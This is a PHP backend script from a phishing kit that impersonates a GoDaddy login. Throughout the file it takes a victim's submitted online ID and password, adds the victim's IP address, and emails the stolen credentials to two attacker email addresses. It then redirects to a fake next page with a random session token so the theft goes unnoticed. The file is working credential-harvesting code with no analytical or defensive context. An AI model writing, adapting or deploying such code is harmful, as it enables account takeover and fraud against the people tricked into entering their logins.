<?php
if($_POST["god8949"] != "" and $_POST["pas90390"] != ""){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------godaddy Info-----------------------\n";
$message .= "|Online ID : ".$_POST['god8949']."\n";
$message .= "|Password : ".$_POST['pas90390']."\n";
 
 $message .= "-------------Vict!m Info-----------------------\n";
 $send = "myteam5000k@gmail.com,mybizarena@yahoo.com";
$subject = "godaddy | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: next.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

  





 